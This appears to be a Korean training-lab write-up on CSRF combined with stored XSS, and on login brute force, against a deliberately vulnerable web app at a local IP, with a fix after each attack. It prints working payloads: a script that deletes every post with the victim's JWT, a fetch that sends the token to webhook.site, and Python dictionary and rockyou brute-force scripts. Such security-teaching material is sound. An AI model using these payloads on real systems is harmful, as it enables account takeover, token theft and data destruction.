# #09 CSRF (XSS 연계)  ·  #10 Brute Force

**OWASP** A01 Broken Access Control / A07 Auth Failures  ·  **난이도** ⭐⭐⭐ / ⭐⭐

---

## #09 — CSRF (XSS 연계 공격)

### 취약점 원인

이 앱은 CSRF 토큰이 없습니다. 인증에 `Authorization: Bearer` 헤더를 사용하므로 순수 CSRF는 성립하지 않지만, **XSS와 결합하면** 피해자의 JWT를 탈취해 피해자를 사칭한 모든 API 요청이 가능합니다.

```
JWT가 localStorage에 저장됨
  → same-origin JavaScript에서 자유롭게 접근 가능
  → XSS로 삽입된 스크립트도 same-origin으로 실행
  → CSRF 토큰 없음 → 서버가 요청 출처 검증 안 함
```

> **전제** — 취약점 #01 Stored XSS가 성공한 상태를 가정합니다.

---

### 공격 실습

**시나리오** — 피해자가 악성 게시글을 열면 피해자 권한으로 게시글 전체 삭제

**Step 1** — 게시글 내용에 아래 스크립트 삽입 (#01 XSS 방식으로 등록)

```html
<script>
(async () => {
  const token = localStorage.getItem('token');
  if (!token) return;

  // 전체 게시글 목록 조회
  const posts = await fetch('/api/board').then(r => r.json());

  // 피해자 권한으로 각 게시글 삭제
  for (const post of posts) {
    await fetch('/api/board/' + post._id, {
      method: 'DELETE',
      headers: { 'Authorization': 'Bearer ' + token }
    });
  }

  alert('공격 완료: ' + posts.length + '개 삭제됨');
})();
</script>
```

**Step 2** — 피해자가 해당 게시글 열람 → 스크립트 실행 → 전체 게시글 삭제

---

### 심화 — JWT 외부 유출 후 원격 조작

**페이로드**
```html
<script>
  fetch('https://webhook.site/YOUR-ID?t=' + encodeURIComponent(localStorage.getItem('token')));
</script>
```

**공격자는 수신한 토큰으로 직접 API 호출** (피해자 PC 없이도 가능)
```bash
curl -k -X DELETE https://192.168.1.20:5000/api/board/<게시글_ID> \
  -H "Authorization: Bearer <탈취한_토큰>"
```

**관리자 계정이 열람할 경우** — 관리자 JWT 탈취 → 관리자 전용 기능(게시글 숨김, 관리자 생성) 전부 가능

---

### 방어

**JWT를 HttpOnly 쿠키에 저장** (XSS로 직접 탈취 불가)
```js
res.cookie('token', jwtToken, {
  httpOnly: true,     // JavaScript 접근 불가
  secure: true,       // HTTPS만
  sameSite: 'Strict'  // CSRF 방지
});
```

**CORS 제한**
```js
app.use(cors({
  origin: 'https://localhost:5173',
  credentials: true
}));
```

---
---

## #10 — Brute Force (Rate Limiting 없음)

### 취약점 원인

로그인 API에 요청 횟수 제한이 없습니다. 비밀번호를 자동으로 무한 시도할 수 있습니다.

---

### 공격 실습

**방법 1 — Python 사전 공격**

```python
import requests, urllib3
urllib3.disable_warnings()

TARGET = "https://192.168.1.20:5000/api/auth/login"
USER   = "admin"
WORDS  = ["123456", "password", "admin", "qwerty", "admin123", "letmein", "root"]

for pw in WORDS:
    r = requests.post(TARGET, json={"userId": USER, "password": pw}, verify=False)
    if r.status_code == 200:
        print(f"[+] 성공! 비밀번호: {pw}")
        print(f"[+] 토큰: {r.json()['token'][:60]}...")
        break
    print(f"[-] '{pw}' 실패")
```

실행 결과:
```
[-] '123456' 실패
[-] 'password' 실패
[+] 성공! 비밀번호: admin
[+] 토큰: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**방법 2 — Burp Suite Intruder**

1. 로그인 요청 캡처 → Intruder 전송 (Ctrl+I)
2. Positions → `"password": "§admin§"` 설정
3. Payloads → 비밀번호 목록 입력
4. Start Attack → Status `200` 인 항목 확인

**방법 3 — rockyou.txt 대규모 공격**

```python
with open("/usr/share/wordlists/rockyou.txt", "r", errors="ignore") as f:
    for pw in f:
        pw = pw.strip()
        r = requests.post(TARGET, json={"userId": USER, "password": pw}, verify=False)
        if r.status_code == 200:
            print(f"[+] {pw}")
            break
        # Rate Limit 없음 → 딜레이 없이 연속 공격 가능
```

---

### 방어

```js
// server.js
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15분
  max: 10,                    // 최대 10회
  message: { message: '너무 많은 로그인 시도입니다. 15분 후 다시 시도하세요.' }
});

app.use('/api/auth/login', loginLimiter);
```

---

## 전체 취약점 연계 시나리오

모든 취약점을 조합한 단계적 공격 흐름입니다.

```
 #10  Brute Force로 admin 비밀번호 'admin' 발견
  ↓
 #06  또는 NoSQL Injection으로 비밀번호 없이 admin 로그인
  ↓
 #07  JWT에 만료 없음 → 탈취한 토큰 영구 사용 가능
  ↓
 #01  admin으로 XSS 게시글 작성
  ↓
 #09  다른 사용자 열람 시 JWT 탈취 + 사칭 API 호출
  ↓
 #02  악성 .html 업로드 → 피싱 페이지 서버에서 호스팅
  ↓
 #03  IDOR로 전체 게시글 수정/삭제
  ↓
 #08  Path Traversal로 서버 소스코드 + SSL 키 탈취
  ↓
 #07  JWT_SECRET 확인 → 임의 역할(role) 위조
  ↓
 #04  DB 조회로 전체 사용자 비밀번호 수집
  ↓
 #05  비밀번호 찾기 API로 보안 답변 브루트포스 후 계정 탈취
```
